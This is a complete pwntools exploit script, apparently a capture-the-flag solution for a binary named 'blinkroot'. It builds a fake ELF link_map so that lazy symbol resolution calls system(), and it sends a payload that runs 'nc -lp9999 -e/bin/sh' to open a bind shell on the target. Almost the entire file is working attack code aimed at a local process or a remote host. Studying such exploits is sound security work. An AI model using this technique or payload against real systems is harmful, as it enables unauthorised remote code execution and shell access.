from pwn import *

g_fname = args.FNAME if (args.FNAME) else "./blinkroot"
g_elf = ELF(g_fname)
context.binary = g_elf

g_libcname = args.LIB if (args.LIB) else "/lib/x86_64-linux-gnu/libc.so.6"
g_libc = ELF(g_libcname)

if (args.LOCAL):
	g_io = process(g_fname)
else:
	h, p = args.RHOST.split(':')
	g_io = remote(h, p)

def getpid():
	if (args.LOCAL):
		log.info("pid:%d\n", g_io.proc.pid)
		pause()

def getSectionShaddr(elf, sec_name):
	shaddr = elf.get_section_by_name(sec_name)["sh_addr"]
	log.debug("%s starts from %#x\n", sec_name, shaddr)
	return shaddr

def forgeLinkMap(addr_linkmap, l_addr, got_of_resolved_func):
	log.debug("Fake linkmap object at %#x, l_addr=%#x, sym@%#x\n", addr_linkmap, l_addr, got_of_resolved_func)
	addr_Elf_Dyn_strtab = addr_linkmap # Any readable address is OK.
	addr_Elf_Dyn_symtab = addr_linkmap + 8
	addr_Elf_Dyn_jmprel = addr_Elf_Dyn_symtab + 0x10 
	addr_Elf_Rela = addr_Elf_Dyn_jmprel + 0x10
	log.debug("DT_STRTAB at %#x\n\tDT_SYMTAB at %#x\n\tDT_JMPREL at %#x\n\tElf64_Rela object at %#x\n"
		, addr_Elf_Dyn_strtab
		, addr_Elf_Dyn_symtab
		, addr_Elf_Dyn_jmprel
		, addr_Elf_Rela
	)

	Elf_Dyn_symtab = flat([0, got_of_resolved_func - 8])
	# In this case, we'll use put@got, its index is 1,
	# so the fake section shaddr of Elf64_Rela should be
	# addr_Elf_Rela - sizeof(Elf64_Rela) == addr_Elf_Rela-24
	Elf_Dyn_jmprel = flat([0, addr_Elf_Rela - 0x18])
	

	r_offset = addr_Elf_Dyn_symtab - l_addr 
	Elf_Rela_obj = flat([
		r_offset, # r_offset, Any writable address is OK.
		7, # r_info = (sym_idx << 32) | sym_type
		0, # r_addend
	])	
	log.debug("Fake Elf_Rela:\n\tr_offset=%x\n", r_offset)

	fake_linkmap = flat([
		l_addr, 
		Elf_Dyn_symtab, # +0x08
		Elf_Dyn_jmprel, # +0x18 
		Elf_Rela_obj,	# +0x28
		'a'*(0x68 - 0x40), # [0x40, 0x68)
		addr_Elf_Dyn_strtab, # +0x68
		addr_Elf_Dyn_symtab, # +0x70
		'a' * (0xf8 - 0x78), # [0x78, 0xf8)
		addr_Elf_Dyn_jmprel
	])
	
	return fake_linkmap

def pwn():
	dynamic_shaddr = getSectionShaddr(g_elf, ".dynamic")
	gotplt_shaddr = getSectionShaddr(g_elf, ".got.plt")

	addr_data = 0x600BC0
	offset = gotplt_shaddr - addr_data
	addr_cmd = addr_data + 0x10
	# Because the executable file closes STDIN, STDOUT, STDERR，
	# we cannot get shell directly via system("/bin/sh\0").
	# We use nc (netcat) to getshell indrectly. Nc can read from client's
	# stdin and send what read to sever, anything that comes back
	# across the connection is sent to client's stdout.

	# because pwnlib's flat() do not pack string to 8-bytes-aligned, 
	# we have to pack it manually.
	cmd_str = "nc -lp9999 -e/bin/sh\0".ljust(0x20, '\0') 
	addr_fake_linkmap = addr_cmd + 0x20
	resolved_func_name = "__libc_start_main"
	l_addr = g_libc.symbols["system"] - g_libc.symbols[resolved_func_name]
	fake_linkmap = forgeLinkMap(addr_fake_linkmap, l_addr, g_elf.got[resolved_func_name])

	payload = flat([offset, addr_fake_linkmap, cmd_str, fake_linkmap]).ljust(0x400, b'\0')

	getpid()
	g_io.send(payload)


if ("__main__" == __name__):
	if (args.DEBUG):
		context.log_level = "debug"
	pwn()
	g_io.interactive()
